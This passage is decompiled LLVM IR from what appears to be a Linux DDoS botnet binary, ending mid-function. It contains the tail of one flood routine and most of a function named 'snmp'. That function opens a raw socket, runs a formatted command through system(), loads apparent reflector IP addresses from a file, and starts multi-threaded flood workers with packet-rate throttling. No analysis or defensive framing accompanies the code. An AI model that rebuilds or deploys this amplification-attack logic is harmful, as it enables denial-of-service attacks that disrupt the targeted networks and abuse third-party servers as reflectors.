  %v3_804a53c = load i32, i32* %v2_804a53c, align 4
  store i32 %v3_804a53c, i32* %v3_804a467, align 4
  %v1_804a545 = call i32 @rand_cmwc(i32 %v3_804a530)
  %v2_804a54e = call i32 @htonl(i32 %v1_804a545)
  %v3_804a54e = trunc i32 %v2_804a54e to i16
  store i16 %v3_804a54e, i16* %v4_804a55b, align 4
  %v3_804a562 = load i16, i16* %v2_804a46d, align 2
  %v3_804a566 = udiv i16 %v3_804a562, 2
  %v9_804a566 = zext i16 %v3_804a566 to i32
  %v4_804a576 = call i32 @csum(i16* %v3_804a481, i32 %v9_804a566)
  %v5_804a576 = trunc i32 %v4_804a576 to i16
  store i16 %v5_804a576, i16* %v4_804a48e, align 2
  %v0_804a587 = load i64, i64* @global_var_807cc80.96, align 8
  %v1_804a587 = trunc i64 %v0_804a587 to i32
  %v1_804a58c = add i32 %v1_804a587, 1
  %v1_804a58d = sext i32 %v1_804a58c to i64
  store i64 %v1_804a58d, i64* @global_var_807cc80.96, align 128
  %v0_804a592 = load i32, i32* @global_var_807cb68.97, align 8
  %v6_804a59d = icmp ugt i32 %v0_804a592, %storemerge
  br i1 %v6_804a59d, label %dec_label_pc_804a501.dec_label_pc_804a5ba_crit_edge, label %dec_label_pc_804a59f

dec_label_pc_804a501.dec_label_pc_804a5ba_crit_edge: ; preds = %dec_label_pc_804a501
  br label %dec_label_pc_804a5ba

dec_label_pc_804a59f:                             ; preds = %dec_label_pc_804a501
  %v0_804a5a9 = load i32, i32* @global_var_806f718.98, align 8
  %v2_804a5b2 = sext i32 %v0_804a5a9 to i64
  %v3_804a5b2 = call i32 @usleep(i64 %v2_804a5b2)
  br label %dec_label_pc_804a5ba

dec_label_pc_804a5ba:                             ; preds = %dec_label_pc_804a501.dec_label_pc_804a5ba_crit_edge, %dec_label_pc_804a59f
  %stack_var_-8248.0 = phi i32 [ %storemerge, %dec_label_pc_804a501.dec_label_pc_804a5ba_crit_edge ], [ 0, %dec_label_pc_804a59f ]
  %v4_804a5ba = add i32 %stack_var_-8248.0, 1
  br label %dec_label_pc_804a501

; uselistorder directives
  uselistorder i32 %v3_804a530, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804a352, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-8240, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ba, { 1, 0 }
  uselistorder label %dec_label_pc_804a4e1, { 1, 0 }
  uselistorder label %dec_label_pc_804a3cf, { 1, 0 }
}

define i32 @snmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-576 = alloca i32, align 4
  %stack_var_-620 = alloca i32, align 4
  %v15_804a5cb = ptrtoint i32* %stack_var_-620 to i32
  store i32 %v15_804a5cb, i32* @eax, align 4
  %v2_804a5df = call i32 @mfork(i32 %arg2)
  store i32 %v2_804a5df, i32* %eax.global-to-local, align 4
  %v1_804a5e7 = icmp eq i32 %v2_804a5df, 0
  %v1_804a5e9 = icmp eq i1 %v1_804a5e7, false
  br i1 %v1_804a5e9, label %dec_label_pc_804ab69, label %dec_label_pc_804a5ef

dec_label_pc_804a5ef:                             ; preds = %entry
  %v4_804a5fb = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v4_804a5fb, i32* %eax.global-to-local, align 4
  %v5_804a606 = icmp slt i32 %v4_804a5fb, 0
  %v1_804a60a = icmp eq i1 %v5_804a606, false
  br i1 %v1_804a60a, label %dec_label_pc_804a616, label %dec_label_pc_804a60c

dec_label_pc_804a60c:                             ; preds = %dec_label_pc_804a5ef
  %v2_804a611 = call i32 @__GI_exit(i32 1)
  store i32 %v2_804a611, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a616

dec_label_pc_804a616:                             ; preds = %dec_label_pc_804a5ef, %dec_label_pc_804a60c
  %v4_804a616 = add i32 %arg3, -5
  %v9_804a616 = sub i32 4, %arg3
  %v10_804a616 = and i32 %v9_804a616, %arg3
  %v11_804a616 = icmp slt i32 %v10_804a616, 0
  %v12_804a616 = icmp eq i32 %v4_804a616, 0
  %v13_804a616 = icmp slt i32 %v4_804a616, 0
  %v3_804a61a = icmp eq i1 %v13_804a616, %v11_804a616
  %v4_804a61a = icmp eq i1 %v12_804a616, false
  %v5_804a61a = and i1 %v4_804a61a, %v3_804a61a
  br i1 %v5_804a61a, label %dec_label_pc_804a63c, label %dec_label_pc_804a61c

dec_label_pc_804a61c:                             ; preds = %dec_label_pc_804a616
  %v3_804a62a = call i32 @Send(i32 %arg1, i32 ptrtoint ([99 x i8]* @global_var_8069240.99 to i32))
  store i32 %v3_804a62a, i32* %eax.global-to-local, align 4
  %v2_804a637 = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804a637, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a63c

dec_label_pc_804a63c:                             ; preds = %dec_label_pc_804a616, %dec_label_pc_804a61c
  %v1_804a63f = add i32 %arg4, 12
  store i32 %v1_804a63f, i32* %eax.global-to-local, align 4
  %v1_804a642 = inttoptr i32 %v1_804a63f to i32*
  %v2_804a642 = load i32, i32* %v1_804a642, align 4
  store i32 %v2_804a642, i32* %edx.global-to-local, align 4
  store i32 %v1_804a63f, i32* %eax.global-to-local, align 4
  %v2_804a64a = load i32, i32* %v1_804a642, align 4
  store i32 %v2_804a64a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a63f, i32* %eax.global-to-local, align 4
  %v2_804a652 = load i32, i32* %v1_804a642, align 4
  store i32 %v2_804a652, i32* @ebx, align 4
  store i32 %v1_804a63f, i32* %eax.global-to-local, align 4
  %v2_804a65a = load i32, i32* %v1_804a642, align 4
  store i32 %v2_804a65a, i32* %eax.global-to-local, align 4
  %v2_804a65c = ptrtoint i32* %stack_var_-576 to i32
  store i32 %v2_804a65c, i32* @esi, align 4
  %v3_804a66f = call i32 @sprintf(i32 %v2_804a65c, i32 ptrtoint ([134 x i8]* @global_var_80692a4.100 to i32))
  store i32 %v2_804a65c, i32* %eax.global-to-local, align 4
  %v2_804a681 = call i32 @system(i32 %v2_804a65c)
  store i32 %v2_804a681, i32* %eax.global-to-local, align 4
  %v3_804a68e = call i32 @__GI_time(i32* null)
  store i32 %v3_804a68e, i32* %eax.global-to-local, align 4
  %v2_804a69a = call i32 @srand(i32 %v3_804a68e)
  store i32 0, i32* @global_var_807dca0.85, align 32
  %v0_804a6b3 = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804a6b3 = ptrtoint i8* %v0_804a6b3 to i32
  store i32 %v1_804a6b3, i32* %eax.global-to-local, align 4
  %v6_804a6c2 = call i32 @fwrite(i32 ptrtoint ([23 x i8]* @global_var_806932a.101 to i32), i32 1, i32 22, i32 %v1_804a6b3)
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804a6d8 = call i32 @malloc(i32 128)
  store i32 %v2_804a6d8, i32* %edx.global-to-local, align 4
  %v1_804a6e9 = inttoptr i32 %v2_804a6d8 to i8*
  store i32 %v2_804a6d8, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a6f0 = call i8* @_memset(i8* %v1_804a6e9, i32 0, i32 128)
  %v6_804a6f0 = ptrtoint i8* %v5_804a6f0 to i32
  store i32 %v6_804a6f0, i32* %ecx.global-to-local, align 4
  %v0_804a6f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a6fa = add i32 %arg4, 16
  store i32 %v1_804a6fa, i32* %eax.global-to-local, align 4
  %v1_804a6fd = inttoptr i32 %v1_804a6fa to i32*
  %v2_804a6fd = load i32, i32* %v1_804a6fd, align 4
  store i32 %v2_804a6fd, i32* %eax.global-to-local, align 4
  %v2_804a703 = call i32 @atol(i32 %v2_804a6fd)
  %v1_804a711 = add i32 %arg4, 20
  store i32 %v1_804a711, i32* %eax.global-to-local, align 4
  %v1_804a714 = inttoptr i32 %v1_804a711 to i32*
  %v2_804a714 = load i32, i32* %v1_804a714, align 4
  store i32 %v2_804a714, i32* %eax.global-to-local, align 4
  %v2_804a71a = call i32 @atol(i32 %v2_804a714)
  store i32 %v2_804a71a, i32* @eax, align 4
  store i32 0, i32* @global_var_807cb68.97, align 8
  store i64 0, i64* @global_var_807cc80.96, align 128
  %v3_804a74d = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_8069341.102 to i32), i32 ptrtoint ([2 x i8]* @global_var_806915a.88 to i32))
  store i32 %v3_804a74d, i32* %eax.global-to-local, align 4
  %v8_804a8cf = inttoptr i32 %v0_804a6f2 to i8*
  %v1_804a76b = and i32 %v0_804a6f2, -256
  %v5_804a7cf = add i32 %v0_804a6f2, -1
  br label %dec_label_pc_804a8c6.outer

dec_label_pc_804a75d:                             ; preds = %dec_label_pc_804a8c6
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a76b, i32* %eax.global-to-local, align 4
  %v3_804a774 = call i32 @_strlen(i8* %v8_804a8cf)
  %v4_804a774 = mul i32 %v3_804a774, -1
  %v5_804a774 = add i32 %v4_804a774, -2
  store i32 %v5_804a774, i32* %ecx.global-to-local, align 4
  %v5_804a77b = sub i32 %v0_804a6f2, %v4_804a774
  %v1_804a77e = add i32 %v5_804a77b, -1
  store i32 %v1_804a77e, i32* %eax.global-to-local, align 4
  %v1_804a77f = inttoptr i32 %v1_804a77e to i8*
  %v2_804a77f = load i8, i8* %v1_804a77f, align 1
  %v3_804a77f = zext i8 %v2_804a77f to i32
  %v5_804a77f = and i32 %v1_804a77e, -256
  %v6_804a77f = or i32 %v3_804a77f, %v5_804a77f
  store i32 %v6_804a77f, i32* %eax.global-to-local, align 4
  %v10_804a781 = icmp eq i8 %v2_804a77f, 10
  br i1 %v10_804a781, label %dec_label_pc_804a7b1, label %dec_label_pc_804a785

dec_label_pc_804a785:                             ; preds = %dec_label_pc_804a75d
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a76b, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804a6f2, i32* @edi, align 4
  %v3_804a79c = call i32 @_strlen(i8* %v8_804a8cf)
  %v4_804a79c = mul i32 %v3_804a79c, -1
  %v5_804a79c = add i32 %v4_804a79c, -2
  store i32 %v5_804a79c, i32* @ecx, align 4
  %v5_804a7a3 = sub i32 %v0_804a6f2, %v4_804a79c
  %v1_804a7a6 = add i32 %v5_804a7a3, -1
  store i32 %v1_804a7a6, i32* %eax.global-to-local, align 4
  %v1_804a7a7 = inttoptr i32 %v1_804a7a6 to i8*
  %v2_804a7a7 = load i8, i8* %v1_804a7a7, align 1
  %v3_804a7a7 = zext i8 %v2_804a7a7 to i32
  %v5_804a7a7 = and i32 %v1_804a7a6, -256
  %v6_804a7a7 = or i32 %v3_804a7a7, %v5_804a7a7
  store i32 %v6_804a7a7, i32* %eax.global-to-local, align 4
  %v10_804a7a9 = icmp eq i8 %v2_804a7a7, 13
  %v1_804a7ab = icmp eq i1 %v10_804a7a9, false
  br i1 %v1_804a7ab, label %dec_label_pc_804a8c6, label %dec_label_pc_804a7b1

dec_label_pc_804a7b1:                             ; preds = %dec_label_pc_804a785, %dec_label_pc_804a75d
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a76b, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804a6f2, i32* @edi, align 4
  %v3_804a7c8 = call i32 @_strlen(i8* %v8_804a8cf)
  %v4_804a7c8 = mul i32 %v3_804a7c8, -1
  %v5_804a7c8 = add i32 %v4_804a7c8, -2
  store i32 %v5_804a7c8, i32* @ecx, align 4
  %v1_804a7d2 = sub i32 %v5_804a7cf, %v4_804a7c8
  %v1_804a7d3 = inttoptr i32 %v1_804a7d2 to i8*
  store i8 0, i8* %v1_804a7d3, align 1
  %v0_804a7d6 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a7d6, i32* %eax.global-to-local, align 4
  %v1_804a7db = icmp eq i32 %v0_804a7d6, 0
  %v1_804a7dd = icmp eq i1 %v1_804a7db, false
  %v2_804a857 = call i32 @malloc(i32 540)
  store i32 %v2_804a857, i32* %eax.global-to-local, align 4
  br i1 %v1_804a7dd, label %dec_label_pc_804a84f, label %dec_label_pc_804a7df

dec_label_pc_804a7df:                             ; preds = %dec_label_pc_804a7b1
  store i32 %v2_804a857, i32* @global_var_807dca0.85, align 32
  store i32 %v2_804a857, i32* %eax.global-to-local, align 4
  %v1_804a7f9 = inttoptr i32 %v2_804a857 to i32*
  store i32 0, i32* %v1_804a7f9, align 4
  %v0_804a7ff = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7ff = add i32 %v0_804a7ff, 4
  %v2_804a7ff = inttoptr i32 %v1_804a7ff to i32*
  store i32 0, i32* %v2_804a7ff, align 4
  %v0_804a806 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a806 = add i32 %v0_804a806, 8
  %v2_804a806 = inttoptr i32 %v1_804a806 to i32*
  store i32 0, i32* %v2_804a806, align 4
  %v0_804a80d = load i32, i32* %eax.global-to-local, align 4
  %v1_804a80d = add i32 %v0_804a80d, 12
  %v2_804a80d = inttoptr i32 %v1_804a80d to i32*
  store i32 0, i32* %v2_804a80d, align 4
  %v0_804a814 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a814, i32* @ebx, align 4
  %v2_804a820 = call i32 @inet_addr(i32 %v0_804a6f2)
  %v1_804a828 = load i32, i32* @ebx, align 4
  %v2_804a828 = add i32 %v1_804a828, 4
  %v3_804a828 = inttoptr i32 %v2_804a828 to i32*
  store i32 %v2_804a820, i32* %v3_804a828, align 4
  %v0_804a82b = load i32, i32* @global_var_807dca0.85, align 32
  %v2_804a836 = add i32 %v0_804a82b, 532
  %v3_804a836 = inttoptr i32 %v2_804a836 to i32*
  store i32 %v0_804a82b, i32* %v3_804a836, align 4
  %v0_804a83c = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a83c, i32* @edx, align 4
  store i32 %v0_804a83c, i32* %eax.global-to-local, align 4
  %v2_804a847 = add i32 %v0_804a83c, 536
  %v3_804a847 = inttoptr i32 %v2_804a847 to i32*
  store i32 %v0_804a83c, i32* %v3_804a847, align 4
  br label %dec_label_pc_804a8c3

dec_label_pc_804a84f:                             ; preds = %dec_label_pc_804a7b1
  store i32 %v2_804a857, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v5_804a872 = inttoptr i32 %v2_804a857 to i8*
  %v5_804a873 = call i32 @__GI_memset(i8* %v5_804a872, i32 0, i32 540)
  store i32 %v5_804a873, i32* %eax.global-to-local, align 4
  %v2_804a881 = call i32 @inet_addr(i32 %v0_804a6f2)
  %v2_804a88e = add i32 %v2_804a857, 4
  %v3_804a88e = inttoptr i32 %v2_804a88e to i32*
  store i32 %v2_804a881, i32* %v3_804a88e, align 4
  %v0_804a891 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a891, i32* %edx.global-to-local, align 4
  %v2_804a89a = add i32 %v2_804a857, 536
  %v3_804a89a = inttoptr i32 %v2_804a89a to i32*
  store i32 %v0_804a891, i32* %v3_804a89a, align 4
  %v0_804a8a0 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a8a0, i32* %eax.global-to-local, align 4
  %v1_804a8a5 = add i32 %v0_804a8a0, 532
  %v2_804a8a5 = inttoptr i32 %v1_804a8a5 to i32*
  %v3_804a8a5 = load i32, i32* %v2_804a8a5, align 4
  %v2_804a8ae = add i32 %v2_804a857, 532
  %v3_804a8ae = inttoptr i32 %v2_804a8ae to i32*
  store i32 %v3_804a8a5, i32* %v3_804a8ae, align 4
  %v0_804a8b4 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a8b4, i32* @edx, align 4
  store i32 %v2_804a857, i32* %eax.global-to-local, align 4
  %v2_804a8bd = add i32 %v0_804a8b4, 532
  %v3_804a8bd = inttoptr i32 %v2_804a8bd to i32*
  store i32 %v2_804a857, i32* %v3_804a8bd, align 4
  br label %dec_label_pc_804a8c3

dec_label_pc_804a8c3:                             ; preds = %dec_label_pc_804a7df, %dec_label_pc_804a84f
  br label %dec_label_pc_804a8c6.outer

dec_label_pc_804a8c6.outer:                       ; preds = %dec_label_pc_804a8c3, %dec_label_pc_804a63c
  br label %dec_label_pc_804a8c6

dec_label_pc_804a8c6:                             ; preds = %dec_label_pc_804a8c6.outer, %dec_label_pc_804a785
  %v4_804a8d2 = call i32 @fgets(i32 %v0_804a6f2, i32 128, i32 %v3_804a74d)
  store i32 %v4_804a8d2, i32* %eax.global-to-local, align 4
  %v1_804a8da = icmp eq i32 %v4_804a8d2, 0
  %v1_804a8dc = icmp eq i1 %v1_804a8da, false
  br i1 %v1_804a8dc, label %dec_label_pc_804a75d, label %dec_label_pc_804a8e2

dec_label_pc_804a8e2:                             ; preds = %dec_label_pc_804a8c6
  %v0_804a8e2 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804a8e2, i32* %eax.global-to-local, align 4
  %v1_804a8e7 = add i32 %v0_804a8e2, 532
  %v2_804a8e7 = inttoptr i32 %v1_804a8e7 to i32*
  %v3_804a8e7 = load i32, i32* %v2_804a8e7, align 4
  %v2_804a8f3 = mul i32 %v2_804a703, 4
  %v1_804a8f9 = add i32 %v2_804a8f3, 30
  %v2_804a8fc = and i32 %v1_804a8f9, -16
  %v2_804a902 = sub i32 %v15_804a5cb, %v2_804a8fc
  %v1_804a910 = add i32 %v2_804a902, 15
  %v2_804a913 = and i32 %v1_804a910, -16
  %v1_804a934 = add i32 %arg4, 4
  store i32 %v1_804a934, i32* %eax.global-to-local, align 4
  %v1_804a937 = inttoptr i32 %v1_804a934 to i32*
  %v2_804a937 = load i32, i32* %v1_804a937, align 4
  store i32 %v2_804a937, i32* %eax.global-to-local, align 4
  %v2_804a93c = add i32 %v2_804a902, -16
  %v3_804a93c = inttoptr i32 %v2_804a93c to i32*
  store i32 %v2_804a937, i32* %v3_804a93c, align 4
  %v1_804a93d = call i32 @inet_addr(i32 %v2_804a913)
  %v0_804a942 = load i32, i32* @esp, align 4
  store i32 %v2_804a8f3, i32* %edx.global-to-local, align 4
  %v2_804a95c = mul i32 %v2_804a703, 28
  %v1_804a961 = add i32 %v2_804a95c, 30
  %v2_804a964 = and i32 %v1_804a961, -16
  %v1_804a942 = sub i32 16, %v2_804a964
  %v2_804a96a = add i32 %v1_804a942, %v0_804a942
  %v1_804a978 = add i32 %v2_804a96a, 15
  %v2_804a97b = and i32 %v1_804a978, -16
  store i32 %v2_804a97b, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804aa4d58 = icmp sgt i32 %v2_804a703, 0
  br i1 %v5_804aa4d58, label %dec_label_pc_804a99c.lr.ph, label %dec_label_pc_804aa53

dec_label_pc_804a99c.lr.ph:                       ; preds = %dec_label_pc_804a8e2
  %v3_804a9d0 = or i32 %v2_804a97b, 8
  %v3_804aa0b = or i32 %v2_804a97b, 4
  br label %dec_label_pc_804a99c

dec_label_pc_804a99c:                             ; preds = %dec_label_pc_804a99c, %dec_label_pc_804a99c.lr.ph
  %storemerge559 = phi i32 [ 0, %dec_label_pc_804a99c.lr.ph ], [ %v4_804aa44, %dec_label_pc_804a99c ]
  %v2_804a9b0 = mul i32 %storemerge559, 28
  %v3_804a9b5 = add i32 %v2_804a9b0, %v2_804a97b
  %v4_804a9b5 = inttoptr i32 %v3_804a9b5 to i32*
  store i32 %storemerge559, i32* %v4_804a9b5, align 4
  store i32 %v2_804a97b, i32* %ecx.global-to-local, align 4
  %v2_804a9be = mul i32 %storemerge559, 4
  store i32 %v2_804a9b0, i32* %edx.global-to-local, align 4
  %v4_804a9d0 = add i32 %v3_804a9d0, %v2_804a9b0
  %v5_804a9d0 = inttoptr i32 %v4_804a9d0 to i32*
  store i32 2, i32* %v5_804a9d0, align 4
  %v1_804a9da = load i32, i32* %edx.global-to-local, align 4
  %v2_804a9da = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a9da = add i32 %v1_804a9da, 12
  %v4_804a9da = add i32 %v3_804a9da, %v2_804a9da
  %v5_804a9da = inttoptr i32 %v4_804a9da to i32*
  store i32 %v1_804a93d, i32* %v5_804a9da, align 4
  %v1_804a9e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a9e4 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a9e4 = add i32 %v1_804a9e4, 16
  %v4_804a9e4 = add i32 %v3_804a9e4, %v2_804a9e4
  %v5_804a9e4 = inttoptr i32 %v4_804a9e4 to i32*
  %v1_804a9ee = load i32, i32* %edx.global-to-local, align 4
  %v2_804a9ee = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a9ee = add i32 %v1_804a9ee, 20
  %v4_804a9ee = add i32 %v3_804a9ee, %v2_804a9ee
  %v5_804a9ee = inttoptr i32 %v4_804a9ee to i32*
  %v4_804aa0b = add i32 %v3_804aa0b, %v2_804a9b0
  %v5_804aa0b = inttoptr i32 %v4_804aa0b to i32*
  store i32 %v3_804a8e7, i32* %v5_804aa0b, align 4
  store i32 %v3_804a9b5, i32* @ecx, align 4
  store i32 %v2_804a913, i32* %edx.global-to-local, align 4
  %v2_804aa30 = add i32 %v2_804a9be, %v2_804a913
  store i32 %v2_804aa30, i32* %eax.global-to-local, align 4
  %v1_804aa33 = load i32, i32* @esp, align 4
  %v2_804aa33 = add i32 %v1_804aa33, -4
  %v3_804aa33 = inttoptr i32 %v2_804aa33 to i32*
  store i32 %v3_804a9b5, i32* %v3_804aa33, align 4
  %v1_804aa34 = add i32 %v1_804aa33, -8
  %v2_804aa34 = inttoptr i32 %v1_804aa34 to i32*
  store i32 134521667, i32* %v2_804aa34, align 4
  %v1_804aa39 = add i32 %v1_804aa33, -12
  %v2_804aa39 = inttoptr i32 %v1_804aa39 to i32*
  store i32 0, i32* %v2_804aa39, align 4
  %v0_804aa3b = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa3b = add i32 %v1_804aa33, -16
  %v3_804aa3b = inttoptr i32 %v2_804aa3b to i32*
  store i32 %v0_804aa3b, i32* %v3_804aa3b, align 4
  %v4_804aa3c = inttoptr i32 %storemerge559 to i32*
  %v5_804aa3c = call i32 @pthread_create(i32* %v4_804aa3c, i32 128, i32 %v0_804a6f2, i32 %v2_804a703)
  %v0_804aa41 = load i32, i32* @esp, align 4
  %v1_804aa41 = add i32 %v0_804aa41, 16
  %v4_804aa44 = add nuw nsw i32 %storemerge559, 1
  store i32 %v4_804aa44, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804aa44, %v2_804a703
  br i1 %exitcond, label %dec_label_pc_804aa53, label %dec_label_pc_804a99c

dec_label_pc_804aa53:                             ; preds = %dec_label_pc_804a99c, %dec_label_pc_804a8e2
  %v0_804aa63.lcssa = phi i32 [ %v2_804a96a, %dec_label_pc_804a8e2 ], [ %v1_804aa41, %dec_label_pc_804a99c ]
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_804a8e2 ], [ %v2_804a703, %dec_label_pc_804a99c ]
  %v1_804aa56 = add i32 %arg4, 8
  store i32 %v1_804aa56, i32* %eax.global-to-local, align 4
  %v1_804aa59 = inttoptr i32 %v1_804aa56 to i32*
  %v2_804aa59 = load i32, i32* %v1_804aa59, align 4
  store i32 %v2_804aa59, i32* %edx.global-to-local, align 4
  store i32 %v1_804a934, i32* %eax.global-to-local, align 4
  %v2_804aa61 = load i32, i32* %v1_804a937, align 4
  store i32 %v2_804aa61, i32* %eax.global-to-local, align 4
  %v2_804aa66 = add i32 %v0_804aa63.lcssa, -16
  %v3_804aa66 = inttoptr i32 %v2_804aa66 to i32*
  store i32 %v2_804aa59, i32* %v3_804aa66, align 4
  %v0_804aa67 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa67 = add i32 %v0_804aa63.lcssa, -20
  %v3_804aa67 = inttoptr i32 %v2_804aa67 to i32*
  store i32 %v0_804aa67, i32* %v3_804aa67, align 4
  %v5_804aa68 = add i32 %v0_804aa63.lcssa, -24
  %v6_804aa68 = inttoptr i32 %v5_804aa68 to i32*
  store i32 %arg2, i32* %v6_804aa68, align 4
  %v1_804aa6b = add i32 %v0_804aa63.lcssa, -28
  %v2_804aa6b = inttoptr i32 %v1_804aa6b to i32*
  store i32 ptrtoint ([37 x i8]* @global_var_806934c.103 to i32), i32* %v2_804aa6b, align 4
  %v5_804aa70 = add i32 %v0_804aa63.lcssa, -32
  %v6_804aa70 = inttoptr i32 %v5_804aa70 to i32*
  store i32 %arg1, i32* %v6_804aa70, align 4
  %v2_804aa73 = call i32 @Send(i32 %storemerge5.lcssa, i32 128)
  %v0_804aa78 = load i32, i32* @esp, align 4
  %v0_804aa7b = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804aa7b = ptrtoint i8* %v0_804aa7b to i32
  store i32 %v1_804aa7b, i32* %eax.global-to-local, align 4
  %v2_804aa80 = add i32 %v0_804aa78, 28
  %v3_804aa80 = inttoptr i32 %v2_804aa80 to i32*
  store i32 %v1_804aa7b, i32* %v3_804aa80, align 4
  %v1_804aa81 = add i32 %v0_804aa78, 24
  %v2_804aa81 = inttoptr i32 %v1_804aa81 to i32*
  store i32 26, i32* %v2_804aa81, align 4
  %v1_804aa83 = add i32 %v0_804aa78, 20
  %v2_804aa83 = inttoptr i32 %v1_804aa83 to i32*
  store i32 1, i32* %v2_804aa83, align 4
  %v1_804aa85 = add i32 %v0_804aa78, 16
  %v2_804aa85 = inttoptr i32 %v1_804aa85 to i32*
  store i32 ptrtoint ([27 x i8]* @global_var_8069371.104 to i32), i32* %v2_804aa85, align 4
  %v4_804aa8a = call i32 @fwrite(i32 %storemerge5.lcssa, i32 128, i32 %v0_804a6f2, i32 %v2_804a703)
  store i32 %v4_804aa8a, i32* %eax.global-to-local, align 4
  %v0_804aa8f = load i32, i32* @esp, align 4
  %v1_804ab4b = add i32 %arg4, 24
  %v1_804ab4e = inttoptr i32 %v1_804ab4b to i32*
  br label %dec_label_pc_804ab48

dec_label_pc_804aa9e:                             ; preds = %dec_label_pc_804ab48
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804aacc = inttoptr i32 %v0_804ab59 to i32*
  store i32 50000, i32* %v3_804aacc, align 4
  %v1_804aacd = sext i32 %storemerge to i64
  %v2_804aacd = call i32 @usleep(i64 %v1_804aacd)
  %v0_804aad2 = load i32, i32* @esp, align 4
  %v0_804aad5 = load i64, i64* @global_var_807cc80.96, align 8
  %sext = mul i64 %v0_804aad5, 4294967296
  %v2_804aade = sdiv i64 %sext, 4294967296
  %v4_804aade = mul nsw i64 %v2_804aade, 20
  %v5_804aade = trunc i64 %v4_804aade to i32
  store i32 %v5_804aade, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804aade, %v2_804a71a
  %v0_804ab0d = load i32, i32* @global_var_807cb68.97, align 8
  store i32 %v0_804ab0d, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804aae8, label %dec_label_pc_804ab0d

dec_label_pc_804aae8:                             ; preds = %dec_label_pc_804aa9e
  %tmp51 = icmp slt i32 %v0_804ab0d, 1
  %tmp52 = icmp eq i1 %tmp51, false
  br i1 %tmp52, label %dec_label_pc_804ab00, label %dec_label_pc_804aaf1

dec_label_pc_804aaf1:                             ; preds = %dec_label_pc_804aae8
  %v0_804aaf1 = load i32, i32* @global_var_806f718.98, align 8
  %v1_804aaf6 = add i32 %v0_804aaf1, 100
  store i32 %v1_804aaf6, i32* %eax.global-to-local, align 4
  store i32 %v1_804aaf6, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804ab3b

dec_label_pc_804ab00:                             ; preds = %dec_label_pc_804aae8
  %v1_804ab05 = add i32 %v0_804ab0d, -1
  store i32 %v1_804ab05, i32* %eax.global-to-local, align 4
  store i32 %v1_804ab05, i32* @global_var_807cb68.97, align 8
  br label %dec_label_pc_804ab3b

dec_label_pc_804ab0d:                             ; preds = %dec_label_pc_804aa9e
  %v1_804ab12 = add i32 %v0_804ab0d, 1
  store i32 %v1_804ab12, i32* @global_var_807cb68.97, align 8
  %v0_804ab18 = load i32, i32* @global_var_806f718.98, align 8
  store i32 %v0_804ab18, i32* %eax.global-to-local, align 4
  %v1_804ab1d = add i32 %v0_804ab18, -25
  %v5_804ab1d = icmp ult i32 %v0_804ab18, 25
  %v9_804ab1d = icmp eq i32 %v1_804ab1d, 0
  %v2_804ab20 = or i1 %v5_804ab1d, %v9_804ab1d
  br i1 %v2_804ab20, label %dec_label_pc_804ab31, label %dec_label_pc_804ab22

dec_label_pc_804ab22:                             ; preds = %dec_label_pc_804ab0d
  store i32 %v1_804ab1d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ab1d, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804ab3b

dec_label_pc_804ab31:                             ; preds = %dec_label_pc_804ab0d
  store i32 0, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804ab3b

dec_label_pc_804ab3b:                             ; preds = %dec_label_pc_804ab22, %dec_label_pc_804ab00, %dec_label_pc_804aaf1, %dec_label_pc_804ab31
  store i64 0, i64* @global_var_807cc80.96, align 128
  %v4_804ab45 = add i32 %storemerge, 1
  br label %dec_label_pc_804ab48

dec_label_pc_804ab48:                             ; preds = %dec_label_pc_804aa53, %dec_label_pc_804ab3b
